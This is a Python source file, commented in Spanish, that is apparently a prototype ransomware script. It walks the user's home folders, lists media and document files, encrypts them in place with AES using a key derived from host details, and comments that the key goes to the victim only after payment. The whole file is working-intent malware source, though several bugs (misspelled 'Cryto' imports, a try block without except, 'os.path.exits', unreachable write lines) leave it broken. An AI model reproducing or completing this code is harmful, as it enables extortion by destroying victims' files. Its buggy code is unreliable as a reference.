#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Created on Sat Jun 8 23:10:20 2019

@author: Rafael Ernesto Perez

"""

#from __future__ import unicode_literals

import operator
import os
import socket
import random
import hashlib
from Cryto.Util import Counter
from Cryto.Cipher import AES

home = os.environ['HOME']
carpetas = os.listdir(home)
carpetas = [x for x in carpetas if not x.startswith('.')]
extensiones = ['.mp3','.mp4','.avi','.doc','.etc']
#print (carpetas)

def encrypt_and_decrypt(archivo,cypto,block_size=16):
  with open(archivo, 'r+b') as archivo_enc:
    contenido_sincifrar=archivo_enc.read(block_size)
    while contenido_sincifrar:
      contenido_cifrado = cypto(contenido_sincifrar)
      if len(contenido_sincifrar) != len(contenido_cifrado):
        raise ValueError('')
        archivo_enc.seek(- len(contenido_sincifrar),1)#muevo entre bloques para cifrarlos
        archivo_enc.write(contenido_cifrado)
        contenido_sincifrar = archivo_enc.read(block_size)



def check_internet():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(2)
  try:
    s.connect(('socket.io,80'))
    print("conectado")
    s.close()

def discover(key):
  file_list = open('file_list','w+') #abre y agrega contenido, sin extension
  for carpeta in carpetas:
    ruta = home+'/'+carpeta
    #print (ruta)
    for extension in extensiones:
      for rutaabs, directorio, archivo in os.walk(ruta):
        #print (archivo)
        for file in archivo:
          if file.endswith(extension):
            file_list.write(os.path.join(rutaabs, file)+'\n') #cambiar barra
    file_list.close()        
    lista = open('file_list','r')
    lista = lista.read().split('\n')
    lista = [l for l in lista if not l == ""]

    #key_file = open('key_file','w+') #guardada la clave simetrica
    #key_file.write(key)
    #key_file.close()
    #esto deberia enviarse despues del pago a la victima solo para desencriptar
    #deberia editarse el codigo
    if os.path.exits('key_file'): # la segunda vez una vez creado el archivo
      key1 = raw_input('Key:')
      key_file = open('key_file','r') #guardada la clave simetrica
      key = key_file.read().split('\n')#la que tenemos como atacantes
      key = ''.join(key)
      if key1 == key:
        c = Counter.new(128)
        cryto = AES.new(key,AES.MODE_CTR,counter=c)
        crytarchives = cryto.decrypt
        for element in lista:
          encrypt_and_decrypt(element,crytarchives)



      key_file.close()
    else:
      c = Counter.new(128) #4 bytes longitud
      cryto = AES.new(key,AES.MODE_CTR,counter=c)
      key_file = open('key_file','w+') #guardada la clave simetrica
      key_file.write(key)
      key_file.close()
      crytarchives = cryto.encrypt

      for element in lista:
        encrypt_and_decrypt(element,crytarchives)



def get_hash():
  hashcomputer = os.environ['HOME'] + os.environ['USER'] + socket.gethostname() + str(random.randint(0,1000000000000000000000000000000))
  hashcomputer = hashlib.sha512(hashcomputer)
  hashcomputer = hashcomputer.hexdigest()
  new_key = []
  for k in hashcomputer:
    if len(new_key) == 32:
      hashcomputer = ''.join(new_key)
      break
    else:
      new_key.append(k)

  return hashcomputer      

def main():
  #pass
  check_internet()
  hashcomputer = get_hash()
  discover(hashcomputer)

if __name__ =='__main__':
  try:
    main()
  except KeyboardInterrupt:
    exit()  